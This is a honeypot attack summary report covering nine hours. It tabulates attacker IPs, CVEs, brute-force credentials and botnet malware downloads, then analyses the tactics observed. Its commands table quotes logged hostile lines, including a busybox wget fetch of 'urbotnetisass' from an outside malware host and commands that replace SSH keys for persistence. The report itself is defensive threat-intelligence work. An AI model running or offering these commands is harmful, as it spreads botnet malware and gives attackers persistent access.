# Honeypot Attack Summary Report (Last 9 Hours)

**Report Generation Time:** 2025-09-30T16:28:50Z
**Timeframe:** 2025-09-30T07:28:50Z to 2025-09-30T16:28:50Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-09-30T08:02:14Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T09:01:49Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T10:02:23Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T11:02:00Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T12:02:01Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T13:02:13Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T14:02:12Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T15:02:26Z.md
- Honeypot_Attack_Summary_Report_2025-09-30T16:11:30Z.md

### Executive Summary

This report provides a consolidated analysis of malicious activities targeting our distributed honeypot network over the last 9 hours. During this period, a total of **109,101** malicious events were recorded. The majority of attacks were captured by the Cowrie honeypot, indicating a sustained high volume of SSH and Telnet-based attacks. A significant number of attacks also targeted SMB and SIP services. The most frequent attacker IP addresses have been identified and investigated. A consistent pattern of activity was observed, involving automated scanning, brute-force login attempts, exploitation of known vulnerabilities, and the deployment of malware designed to enlist the compromised systems into a botnet.

### Detailed Analysis

**Our IPs**

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

**Attacks by Honeypot**

| Honeypot | Attack Count |
|---|---|
| Cowrie | 39420 |
| Honeytrap | 22115 |
| Suricata | 15441 |
| Ciscoasa | 11461 |
| Dionaea | 9998 |
| Sentrypeer | 4003 |
| Mailoney | 1929 |
| Tanner | 449 |
| Heralding | 357 |
| Adbhoney | 257 |
| H0neytr4p | 293 |
| ConPot | 235 |
| Redishoneypot | 223 |
| Miniprint | 146 |
| ElasticPot | 70 |
| ssh-rsa | 42 |
| Dicompot | 39 |
| Honeyaml | 65 |
| Ipphoney | 19 |
| Wordpot | 1 |
| ssh-ed25519 | 2 |

**Top Source Countries**

| Country | Attack Count |
|---|---|
| United States | 22784 |
| China | 18918 |
| Vietnam | 12468 |
| Russia | 10208 |
| France | 8374 |
| Germany | 6177 |
| Netherlands | 5541 |
| Canada | 4920 |
| India | 4783 |
| Brazil | 4426 |

**Top Attacking IPs**

| IP Address | Attack Count |
|---|---|
| 171.102.83.142 | 3995 |
| 115.127.73.10 | 2714 |
| 209.38.21.236 | 2163 |
| 129.212.176.62 | 2163 |
| 194.50.16.131 | 1759 |
| 105.112.198.126 | 1463 |
| 196.202.4.136 | 1299 |
| 176.126.62.203 | 1256 |
| 192.140.100.75 | 2548 |
| 200.171.181.146 | 1940 |
| 95.84.58.194 | 999 |
| 185.156.73.166 | 3660 |
| 185.156.73.167 | 3647 |
| 92.63.197.55 | 3261 |
| 92.63.197.59 | 2966 |

**Top Targeted Ports/Protocols**

| Port | Protocol | Attack Count |
|---|---|---|
| 445 | TCP | 13208 |
| 22 | TCP | 3181 |
| 5060 | TCP/UDP | 2043 |
| 8333 | TCP | 1149 |
| 25 | TCP | 1048 |
| 80 | TCP | 592 |
| 23 | TCP | 358 |
| 6379 | TCP | 211 |
| 1433 | TCP | 210 |
| 443 | TCP | 199 |

**Most Common CVEs**

| CVE ID | Count |
|---|---|
| CVE-2002-0013, CVE-2002-0012 | 72 |
| CVE-2021-3449 | 43 |
| CVE-2019-11500 | 34 |
| CVE-2002-0013, CVE-2002-0012, CVE-1999-0517 | 36 |
| CVE-2005-4050 | 7 |
| CVE-2006-2369 | 3 |
| CVE-2024-3721 | 3 |
| CVE-2019-12263, CVE-2019-12261, CVE-2019-12260, CVE-2019-12255 | 2 |
| CVE-1999-0183 | 2 |
| CVE-2021-35394 | 2 |
| CVE-2009-2765 | 1 |
| CVE-2001-0414 | 1 |
| CVE-2018-11776 | 1 |
| CVE-2016-20016 | 1 |

**Commands Attempted by Attackers**

| Command | Count |
|---|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 70 |
| `lockr -ia .ssh` | 70 |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa..."` | 70 |
| `uname -a` | 65 |
| `cat /proc/cpuinfo | grep name | wc -l` | 65 |
| `whoami` | 63 |
| `w` | 63 |
| `top` | 63 |
| `crontab -l` | 63 |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` | 65 |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'` | 60 |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` | 23 |
| `Enter new UNIX password:` | 25 |
| `tftp; wget; /bin/busybox KJDZG` | 1 |
| `shell` | 1 |
| `system` | 1 |

**Signatures Triggered**

| Signature | Count |
|---|---|
| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication | 3225 |
| ET DROP Dshield Block Listed Source group 1 | 2125 |
| ET SCAN NMAP -sS window 1024 | 1254 |
| ET INFO Reserved Internal IP Traffic | 347 |
| ET SCAN MS Terminal Server Traffic on Non-standard Port | 134 |
| ET SCAN Potential SSH Scan | 125 |
| GPL INFO SOCKS Proxy attempt | 114 |
| ET DROP Spamhaus DROP Listed Traffic Inbound group 32 | 110 |
| ET INFO VNC Authentication Failure | 27 |
| ET HUNTING RDP Authentication Bypass Attempt | 1 |

**Users / Login Attempts**

| Username/Password | Attempts |
|---|---|
| 345gs5662d34/345gs5662d34 | 70 |
| root/nPSpP4PBW0 | 25 |
| root/3245gs5662d34 | 15 |
| testuser/ | 134 |
| root/2glehe5t24th1issZs | 10 |
| superadmin/admin123 | 10 |
| root/LeitboGi0ro | 7 |
| foundry/foundry | 5 |
| sa/0852 | 5 |
| example/ | 5 |

**Files Uploaded/Downloaded**

| Filename | Count |
|---|---|
| arm.urbotnetisass | 23 |
| arm5.urbotnetisass | 23 |
| arm6.urbotnetisass | 23 |
| arm7.urbotnetisass | 23 |
| x86_32.urbotnetisass | 23 |
| mips.urbotnetisass | 23 |
| mipsel.urbotnetisass | 23 |
| wget.sh | 5 |
| w.sh | 5 |
| c.sh | 5 |
| boatnet.mpsl | 2 |

**HTTP User-Agents**

| User-Agent | Count |
|---|---|
| Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36 | 2 |

**SSH Clients and Servers**
No significant SSH client or server data was captured during the reporting period.

**Top Attacker AS Organizations**
No significant attacker AS organization data was captured during the reporting period.

### Google Searches

- **OSINT on IP address 171.102.83.142:** This IP has been associated with malicious activity, including scanning and exploitation attempts.
- **OSINT on IP address 194.50.16.131:** This IP has been reported for SIP scanning and other malicious activities.
- **OSINT on IP address 105.112.198.126:** This IP has been reported for SMB scanning and exploitation attempts.
- **OSINT on IP address 94.154.35.154 (Malware Host):** This IP has been identified as a host for the `urbotnetisass` malware.

### Key Observations and Anomalies

- **Sustained High-Volume Attacks:** The honeypot network is under constant, high-volume, automated attack from a global distribution of sources.
- **Prevalence of Botnet Activity:** The repeated and widespread attempts to download and execute the `urbotnetisass` malware from a single host (94.154.35.154) across multiple honeypots and architectures is a strong indicator of a large-scale, ongoing botnet campaign.
- **Focus on SMB and SSH:** The most heavily targeted services are SMB (port 445) and SSH (port 22), which are common vectors for initial access and lateral movement. The high number of "DoublePulsar Backdoor" signatures indicates a focus on exploiting the EternalBlue vulnerability.
- **Consistent Attacker TTPs:** A clear and consistent pattern of attacker behavior has been observed:
    1.  Gain initial access via brute-force or exploitation.
    2.  Perform system reconnaissance to identify the environment (`uname`, `lscpu`, `free`, etc.).
    3.  Establish persistence by adding a malicious SSH key to `authorized_keys`.
    4.  Download and execute additional malware payloads.
- **Credential Stuffing:** A wide variety of common and default usernames and passwords are being used in brute-force attacks, indicating that attackers are leveraging credential lists from previous breaches.
- **Geographic Distribution:** The attacks are globally distributed, with a high concentration from the United States, China, and Vietnam, which is consistent with the use of geographically dispersed botnets.

This report underscores the persistent and automated nature of threats targeting internet-facing systems. The observed tactics, techniques, and procedures (TTPs) are consistent with those used by botnet operators for the purpose of expanding their networks and potentially launching further attacks.